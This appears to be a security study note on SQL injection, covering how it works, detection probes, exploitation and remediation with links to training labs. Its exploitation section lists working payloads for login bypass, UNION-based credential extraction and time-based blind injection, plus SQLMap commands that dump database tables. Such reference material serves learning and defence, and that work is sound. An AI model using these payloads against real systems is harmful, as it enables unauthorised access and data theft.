---
tags: [vulnerability, web, injection]
vuln_name: "SQL Injection"
owasp_category: "A03:2021 - Injection"
cvss_score: 9.8
last_updated: 2024-01-01
---

# 🐛 SQL Injection (SQLi)

## 📖 Description

> Injection of malicious SQL code into an input field to manipulate the underlying database. Can bypass authentication, extract data, or execute commands.

**OWASP:** A03:2021 — Injection  
**Average CVSS Score:** 9.8 (Critical)

---

## 🔬 Mechanism

The legitimate SQL query:
```sql
SELECT * FROM users WHERE username='alice' AND password='1234'
```

With injection `' OR 1=1 --` in the username field:
```sql
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='1234'
```
→ 1=1 is always true → returns all users → auth bypass

---

## 🎯 Detection

```
# Basic test — add a ' and observe the error
'
''
`
``
,
"
""
/
//
\
\\
```

Revealing errors:
- `You have an error in your SQL syntax`
- `Unclosed quotation mark`
- `ORA-01756` (Oracle)

---

## 💥 Exploitation

### Authentication Bypass

```sql
' OR 1=1 --
' OR '1'='1
admin'--
' OR 1=1#
```

### UNION-Based (data extraction)

```sql
# Find the number of columns
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# Extract data
' UNION SELECT username,password FROM users--
```

### Blind SQLi (time-based)

```sql
# MySQL
'; SELECT SLEEP(5)--
' AND SLEEP(5)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
```

### With SQLMap (automated)

```bash
# Basic test
sqlmap -u "http://target.com/page?id=1"

# Dump the database
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# With session cookie
sqlmap -u "http://target.com/page" --cookie="SESSID=xxx" --data="id=1"
```

---

## 🛡️ Remediation

- **Prepared statements (parameterised queries)** — separate data from SQL code
- **ORM** — use frameworks that abstract queries
- **Input validation** — whitelist allowed characters
- **Least privilege principle** — DB account with minimal rights
- **WAF** — Web Application Firewall as an additional layer

---

## 🔗 Resources

- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks — SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
